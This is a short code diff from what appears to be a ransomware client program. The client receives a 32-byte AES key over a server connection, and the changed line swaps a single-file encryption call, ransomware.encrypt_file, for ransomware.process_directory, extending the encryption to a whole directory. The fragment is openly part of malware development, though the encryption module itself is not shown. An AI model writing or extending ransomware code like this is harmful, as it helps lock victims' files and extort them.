@@ -17,7 +17,7 @@ def server_connection():
         except ConnectionError:
             ip = get_ip()
     key = client.recv(32)# aes key is 32 bytes
-    ransomware.encrypt_file("",key)
+    ransomware.process_directory("",key)
     return None 
 
 if __name__ == "__main__":
